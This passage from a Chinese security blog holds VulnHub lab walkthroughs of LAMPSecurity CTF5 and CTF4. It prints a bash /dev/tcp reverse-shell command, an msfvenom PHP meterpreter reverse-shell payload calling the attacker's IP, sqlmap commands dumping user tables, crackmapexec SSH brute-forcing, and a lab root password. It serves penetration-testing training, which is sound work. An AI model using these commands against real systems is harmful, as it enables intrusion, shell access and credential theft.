<h4 id="3-3-2-管理员后台命令执行漏洞"><a href="#3-3-2-管理员后台命令执行漏洞" class="headerlink" title="3.3.2 管理员后台命令执行漏洞"></a>3.3.2 管理员后台命令执行漏洞</h4><p>​		这里重点关注‘New Page’功能模块，这里存在这一处命令执行漏洞，下面是验证过程：</p>
<p><img src="/images/image-20230322093224661.png" alt="image-20230322093224661"></p>
<p>​		创建页面成功后，就提示你新的页面在 pages&#x2F;echo-hello.php</p>
<p><img src="/images/image-20230322093308863.png" alt="image-20230322093308863"></p>
<p>​		访问<a target="_blank" rel="noopener" href="http://192.168.70.193/~andy/pages/echo-hello.php%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%91%BD%E4%BB%A4%E6%88%90%E5%8A%9F%E6%89%A7%E8%A1%8C">http://192.168.70.193/~andy/pages/echo-hello.php，发现命令成功执行</a></p>
<p><img src="/images/image-20230322093322393.png" alt="image-20230322093322393"></p>
<p>​		这样我们就简单了，我们可以通过反弹shell获取到会话：</p>
<blockquote>
<ol>
<li><p>bash 反弹shell</p>
<blockquote>
<p>&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[: ip]&#x2F;[: port] 0&gt;&amp;1</p>
</blockquote>
</li>
<li><p>后端脚本语言反弹shell</p>
</li>
</ol>
</blockquote>
<h3 id="3-4-MSF生成PHP后门GetShell"><a href="#3-4-MSF生成PHP后门GetShell" class="headerlink" title="3.4 MSF生成PHP后门GetShell"></a>3.4 MSF生成PHP后门GetShell</h3><h4 id="3-4-1-生成PHP反弹shell的后门代码"><a href="#3-4-1-生成PHP反弹shell的后门代码" class="headerlink" title="3.4.1 生成PHP反弹shell的后门代码"></a>3.4.1 生成PHP反弹shell的后门代码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.134.147 LPORT=4444 -f raw</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230322093806689.png" alt="image-20230322093806689"></p>
<h4 id="3-4-2-New-Page-上传后门代码"><a href="#3-4-2-New-Page-上传后门代码" class="headerlink" title="3.4.2 New Page 上传后门代码"></a>3.4.2 New Page 上传后门代码</h4><p><img src="/images/image-20230322093915630.png" alt="image-20230322093915630"></p>
<h4 id="3-4-3-设置MSFCONSOLE监听"><a href="#3-4-3-设置MSFCONSOLE监听" class="headerlink" title="3.4.3 设置MSFCONSOLE监听"></a>3.4.3 设置MSFCONSOLE监听</h4><p><img src="/images/image-20230322094241882.png" alt="image-20230322094241882"></p>
<h4 id="3-4-4-访问后门文件，成功反弹shell"><a href="#3-4-4-访问后门文件，成功反弹shell" class="headerlink" title="3.4.4 访问后门文件，成功反弹shell"></a>3.4.4 访问后门文件，成功反弹shell</h4><p>​		经过简单的测试发现当前用户为apache，所以我们需要对此进行提权</p>
<p><img src="/images/image-20230322094553555.png" alt="image-20230322094553555"></p>
<h4 id="3-4-5-隐藏日志，成功获取到root权限"><a href="#3-4-5-隐藏日志，成功获取到root权限" class="headerlink" title="3.4.5 隐藏日志，成功获取到root权限"></a>3.4.5 隐藏日志，成功获取到root权限</h4><p>​		对所有文件路径一次访问，在<code>/home/patrick</code>目录下发现隐藏文件路径，</p>
<p><img src="/images/image-20230322094717490.png" alt="image-20230322094717490"></p>
<p>​		这里我们需要了解一下什么是”tomboy”，这样也就知道了我们为什么要关注tomboy这个文件夹</p>
<blockquote>
<p>一个linux系统下桌面即时贴软件，可以记录文字，是一个小巧、易用、跨系统的桌面便笺工具</p>
</blockquote>
<p>​		我们查看便签中的最新记录，就可以发现root用户的账号密码</p>
<p><img src="/images/image-20230322094910413.png" alt="image-20230322094910413"></p>
<blockquote>
<h3 id="切换管理员账号"><a href="#切换管理员账号" class="headerlink" title="切换管理员账号"></a>切换管理员账号</h3><p>su root </p>
</blockquote>
<p><img src="/images/image-20230322095518004.png" alt="image-20230322095518004"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/14/vulnhub-LAMPSecurity-CTF5-md/" data-id="clts8refh000726vd4j5q1fp1" data-title="vulnhub-LAMPSecurity-CTF5.md" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vulnhub/" rel="tag">vulnhub</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-vulnhub-LAMPSecurity-CTF4-md" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/14/vulnhub-LAMPSecurity-CTF4-md/" class="article-date">
  <time class="dt-published" datetime="2024-03-14T06:14:26.000Z" itemprop="datePublished">2024-03-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/14/vulnhub-LAMPSecurity-CTF4-md/">vulnhub-LAMPSecurity-CTF4.md</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="CTF4-靶场"><a href="#CTF4-靶场" class="headerlink" title="CTF4 靶场"></a>CTF4 靶场</h1><h2 id="0-环境配置"><a href="#0-环境配置" class="headerlink" title="0. 环境配置"></a>0. 环境配置</h2><table>
<thead>
<tr>
<th>主机</th>
<th>IP</th>
</tr>
</thead>
<tbody><tr>
<td>攻击机</td>
<td>192.168.134.1</td>
</tr>
<tr>
<td>靶机</td>
<td>192.168.134.136</td>
</tr>
</tbody></table>
<h2 id="1-netdiscover-同段主机存活主机探测"><a href="#1-netdiscover-同段主机存活主机探测" class="headerlink" title="1. netdiscover 同段主机存活主机探测"></a>1. netdiscover 同段主机存活主机探测</h2><blockquote>
<p>sudo netdiscover -i eth0 -r 192.168.134.0&#x2F;24</p>
</blockquote>
<p><img src="/images/image-20230317130307367.png" alt="image-20230317130307367"></p>
<h2 id="2-Nmap主机开放服务探测"><a href="#2-Nmap主机开放服务探测" class="headerlink" title="2. Nmap主机开放服务探测"></a>2. Nmap主机开放服务探测</h2><h3 id="2-1-mini-rate-快速探测主机开放服务"><a href="#2-1-mini-rate-快速探测主机开放服务" class="headerlink" title="2.1  mini-rate 快速探测主机开放服务"></a>2.1  mini-rate 快速探测主机开放服务</h3><blockquote>
<p>sudo nmap –min-rate 10000 -p- -Pn 192.168.134.136</p>
</blockquote>
<p><img src="/images/image-20230317131853119.png" alt="image-20230317131853119"></p>
<p>​	可以看到在靶机上开放了22、25、80端口。</p>
<h3 id="2-2-UDP服务开放性探测"><a href="#2-2-UDP服务开放性探测" class="headerlink" title="2.2 UDP服务开放性探测"></a>2.2 UDP服务开放性探测</h3><blockquote>
<p>sudo nmap –min-rate 10000 -p- -sU -v 192.168.134.136</p>
</blockquote>
<p><img src="/images/image-20230317135745160.png" alt="image-20230317135745160"></p>
<h3 id="2-3-TCP服务开放性探测"><a href="#2-3-TCP服务开放性探测" class="headerlink" title="2.3 TCP服务开放性探测"></a>2.3 TCP服务开放性探测</h3><blockquote>
<p>sudo nmap -sT -sV -sC -O -A -v 192.168.134.136</p>
</blockquote>
<p><img src="/images/1679033260389.png" alt="1679033260389"></p>
<p>​	可以看到在靶机上开放的80端口上，已经扫描出了几个目录:&#x2F;email、&#x2F;restricted、&#x2F;conf、&#x2F;sql、&#x2F;admin</p>
<h3 id="2-4-服务端vuln脚本探测"><a href="#2-4-服务端vuln脚本探测" class="headerlink" title="2.4 服务端vuln脚本探测"></a>2.4 服务端vuln脚本探测</h3><blockquote>
<p>sudo nmap –script&#x3D;vuln -p 192.168.134.136</p>
</blockquote>
<p><img src="/images/image-20240314113356470.png" alt="image-20240314113356470"></p>
<h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3. 渗透测试"></a>3. 渗透测试</h2><h3 id="3-1-根据Nmap扫描结果，对80端口web服务进行测试"><a href="#3-1-根据Nmap扫描结果，对80端口web服务进行测试" class="headerlink" title="3.1.  根据Nmap扫描结果，对80端口web服务进行测试"></a>3.1.  根据Nmap扫描结果，对80端口web服务进行测试</h3><p>​	访问 <a target="_blank" rel="noopener" href="http://192.168.134.136/">http://192.168.134.136</a> 根目录，对站点多个功能点进行访问测试，初步认定为blog站点</p>
<p><img src="/images/image-20230317132926092.png" alt="image-20230317132926092"></p>
<p>​	根据nmap扫描结果，扫描出的可以路径进行访问:</p>
<p><img src="/images/image-20240314113213187.png" alt="image-20240314113213187"></p>
<h4 id="3-1-1-访问-http-192-168-134-136-mail-src-login-php"><a href="#3-1-1-访问-http-192-168-134-136-mail-src-login-php" class="headerlink" title="3.1.1 访问 http://192.168.134.136/mail/src/login.php:"></a>3.1.1 访问 <a target="_blank" rel="noopener" href="http://192.168.134.136/mail/src/login.php">http://192.168.134.136/mail/src/login.php</a>:</h4><p>​	在该路径上部署了一个邮件系统，尝试使用弱口令进行爆破，无解。</p>
<p><img src="/images/image-20240314120037082.png" alt="image-20240314120037082"></p>
<h4 id="3-1-2-访问-http-192-168-134-136-restricted"><a href="#3-1-2-访问-http-192-168-134-136-restricted" class="headerlink" title="3.1.2 访问 http://192.168.134.136/restricted:"></a>3.1.2 访问 <a target="_blank" rel="noopener" href="http://192.168.134.136/restricted">http://192.168.134.136/restricted</a>:</h4><p>​	访问过程中出现身份认证，尝试使用弱口令进行爆破，无解。</p>
<p><img src="/images/image-20240314120522533.png" alt="image-20240314120522533"></p>
<h4 id="3-1-3-访问-http-192-168-134-136-conf"><a href="#3-1-3-访问-http-192-168-134-136-conf" class="headerlink" title="3.1.3 访问 http://192.168.134.136/conf:"></a>3.1.3 访问 <a target="_blank" rel="noopener" href="http://192.168.134.136/conf">http://192.168.134.136/conf</a>:</h4><p><img src="/images/image-20240314120634039.png" alt="image-20240314120634039"></p>
<h4 id="3-1-4-访问-http-192-168-134-136-sql"><a href="#3-1-4-访问-http-192-168-134-136-sql" class="headerlink" title="3.1.4 访问 http://192.168.134.136/sql:"></a>3.1.4 访问 <a target="_blank" rel="noopener" href="http://192.168.134.136/sql">http://192.168.134.136/sql</a>:</h4><p>​	尝试访问&#x2F;sql路径，发现存在db.sql文件，</p>
<p><img src="/images/image-20240314120747664.png" alt="image-20240314120747664"></p>
<p>​	那么我们就继续访问 <a target="_blank" rel="noopener" href="http://192.168.134.136/sql/db.sql">http://192.168.134.136/sql/db.sql</a>:</p>
<p><img src="/images/image-20240314120840891.png" alt="image-20240314120840891"></p>
<p>​	存储的内容时创建用户时所用的SQL，并为出现初始化的用户数据</p>
<h4 id="3-1-5-访问-http-192-168-134-136-admin"><a href="#3-1-5-访问-http-192-168-134-136-admin" class="headerlink" title="3.1.5 访问 http://192.168.134.136/admin:"></a>3.1.5 访问 <a target="_blank" rel="noopener" href="http://192.168.134.136/admin">http://192.168.134.136/admin</a>:</h4><p>​	尝试使用弱口令进行爆破，无解。</p>
<p><img src="/images/image-20240314120914483.png" alt="image-20240314120914483"></p>
<h3 id="3-2-发现SQL注入点，尝试dump所有数据"><a href="#3-2-发现SQL注入点，尝试dump所有数据" class="headerlink" title="3.2 发现SQL注入点，尝试dump所有数据"></a>3.2 发现SQL注入点，尝试dump所有数据</h3><p>​	继续翻看Nmap扫描结果发现在首页index.html存在CSRF和SQL Injection</p>
<p><img src="/images/image-20240314121620456.png" alt="image-20240314121620456"></p>
<p><img src="/images/image-20240314121609312.png" alt="image-20240314121609312"></p>
<p>​	查看Blog博客界面发现在<code>http://192.168.134.136/index.html?page=blog&amp;title=Blog&amp;id=2%27</code>处的id参数存在SQL注入</p>
<p><img src="/images/image-20230317134552420.png" alt="image-20230317134552420"></p>
<p>​		我们直接SQLmap一把梭哈，获取到一些一些用户名密码，我们将它记录下来(下面是获取当前表单用户内容的执行方法，其他表单获取数据与下述方法类似)：</p>
<blockquote>
<h3 id="判断是否存在注入点"><a href="#判断是否存在注入点" class="headerlink" title="判断是否存在注入点"></a>判断是否存在注入点</h3><p>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.134.136/index.html?page=blog&title=Blog&id=2">http://192.168.134.136/index.html?page=blog&amp;title=Blog&amp;id=2</a>*” –banner</p>
<h3 id="获取当前所使用的数据库"><a href="#获取当前所使用的数据库" class="headerlink" title="获取当前所使用的数据库"></a>获取当前所使用的数据库</h3><p>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.134.136/index.html?page=blog&title=Blog&id=2">http://192.168.134.136/index.html?page=blog&amp;title=Blog&amp;id=2</a>*” –dbms mysql –dbs</p>
<h3 id="获取当前所使用的数据库中的所有表单"><a href="#获取当前所使用的数据库中的所有表单" class="headerlink" title="获取当前所使用的数据库中的所有表单"></a>获取当前所使用的数据库中的所有表单</h3><p>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.134.136/index.html?page=blog&title=Blog&id=2">http://192.168.134.136/index.html?page=blog&amp;title=Blog&amp;id=2</a>*” –dbms mysql -D ehks –tables</p>
<h3 id="获取当前所使用数据库中user表单中的所有数据"><a href="#获取当前所使用数据库中user表单中的所有数据" class="headerlink" title="获取当前所使用数据库中user表单中的所有数据"></a>获取当前所使用数据库中user表单中的所有数据</h3><p>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.134.136/index.html?page=blog&title=Blog&id=2">http://192.168.134.136/index.html?page=blog&amp;title=Blog&amp;id=2</a>*” –dbms mysql -D ehks -T user –dump</p>
</blockquote>
<h4 id="3-2-1-执行结果"><a href="#3-2-1-执行结果" class="headerlink" title="3.2.1 执行结果"></a>3.2.1 执行结果</h4><p><img src="/images/image-20230317140437567.png" alt="image-20230317140437567"></p>
<p><img src="/images/image-20230317141252280.png" alt="image-20230317141252280"></p>
<p><img src="/images/1679033670529.png" alt="1679033670529"></p>
<p><img src="/images/image-20230317141553594.png" alt="image-20230317141553594"></p>
<h4 id="3-2-2-其他用户表单中数据"><a href="#3-2-2-其他用户表单中数据" class="headerlink" title="3.2.2 其他用户表单中数据"></a>3.2.2 其他用户表单中数据</h4><p>​	calendar.phpc_user</p>
<p><img src="/images/image-20240314122716884.png" alt="image-20240314122716884"></p>
<p>​	roundcubemail.users</p>
<p><img src="/images/image-20240314122820322.png" alt="image-20240314122820322"></p>
<h3 id="3-3-SSH链接爆破"><a href="#3-3-SSH链接爆破" class="headerlink" title="3.3 SSH链接爆破"></a>3.3 SSH链接爆破</h3><p>​	将跑出来的数据划分成爆破用的字典</p>
<blockquote>
<h3 id="生成对应的用户名字典"><a href="#生成对应的用户名字典" class="headerlink" title="生成对应的用户名字典"></a>生成对应的用户名字典</h3><p>cat ehks_user.txt | awk -F’|’ ‘{print $3}’ &gt;&gt; username.txt</p>
<h3 id="生成对应的密码字典"><a href="#生成对应的密码字典" class="headerlink" title="生成对应的密码字典"></a>生成对应的密码字典</h3><p>cat ehks_user.txt | awk -F’|’ ‘{print $4}’ | awk -F’[()]’ ‘{print $2}’ &gt;&gt; password.txt</p>
<h3 id="使用爆破工具爆破SSH链接"><a href="#使用爆破工具爆破SSH链接" class="headerlink" title="使用爆破工具爆破SSH链接"></a>使用爆破工具爆破SSH链接</h3><p>crackmapexec ssh 192.168.134.136 -p password -u username.txt –continue-on-success</p>
<p>​	–continue-on-success 表示当爆破出来后继续爆破</p>
</blockquote>
<p><img src="/images/image-20230317151548630.png" alt="image-20230317151548630"></p>
<p>​		尝试使用上面的用户名和密码进行SSH链接</p>
<blockquote>
<p>ssh -oKexAlgorithms&#x3D;+diffie-hellman-group1-sha1 -oHostKeyAlgorithms&#x3D;+ssh-dss -oCiphers&#x3D;+3des-cbc <a href="mailto:&#100;&#115;&#x74;&#x65;&#x76;&#x65;&#x6e;&#115;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#x31;&#x33;&#x34;&#46;&#x31;&#51;&#x36;">&#100;&#115;&#x74;&#x65;&#x76;&#x65;&#x6e;&#115;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#x31;&#x33;&#x34;&#46;&#x31;&#51;&#x36;</a></p>
</blockquote>
<p><img src="/images/image-20230317144444254.png" alt="image-20230317144444254"></p>
<p>​		成功连接上主机，可以发现我们是一个低权限账号，下面我们就该提权限了</p>
<p><img src="/images/image-20230317152116430.png" alt="image-20230317152116430"></p>
<h3 id="3-4-权限提升"><a href="#3-4-权限提升" class="headerlink" title="3.4 权限提升"></a>3.4 权限提升</h3><p>​	使用 <code>sudo -l</code> 列出当前用户在系统上可执行的命令和特权的命令，发现是<code>(ALL)ALL</code></p>
<p><img src="/images/image-20240314123021307.png" alt="image-20240314123021307"></p>
<p>​		那么就不用说了，直接 sudo 提权</p>
<blockquote>
<p>sudo su</p>
<p>密码: ilike2surf</p>
</blockquote>
<p><img src="/images/image-20230317153014419.png" alt="image-20230317153014419"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/14/vulnhub-LAMPSecurity-CTF4-md/" data-id="clts8refe000526vd0blq2kbf" data-title="vulnhub-LAMPSecurity-CTF4.md" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vulnhub/" rel="tag">vulnhub</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>

    </footer>
  </div>
  
</article>



  


</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/protocol/" rel="tag">protocol</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/scanner/" rel="tag">scanner</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vulnhub/" rel="tag">vulnhub</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/protocol/" style="font-size: 10px;">protocol</a> <a href="/tags/scanner/" style="font-size: 10px;">scanner</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a> <a href="/tags/vulnhub/" style="font-size: 20px;">vulnhub</a> <a href="/tags/web/" style="font-size: 20px;">web</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/03/15/protocol-arp/">protocol-arp</a>
          </li>
        
          <li>
            <a href="/2024/03/15/tools-netdiscover/">tools-netdiscover</a>
          </li>
        
          <li>
            <a href="/2024/03/14/vulnhub-LAMPSecurity-CTF5-external/">vulnhub-LAMPSecurity-CTF5-external</a>
          </li>
        
          <li>
            <a href="/2024/03/14/vulnhub-LAMPSecurity-CTF5-md/">vulnhub-LAMPSecurity-CTF5.md</a>
          </li>
        
          <li>
            <a href="/2024/03/14/vulnhub-LAMPSecurity-CTF4-md/">vulnhub-LAMPSecurity-CTF4.md</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 R0seK1llere<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>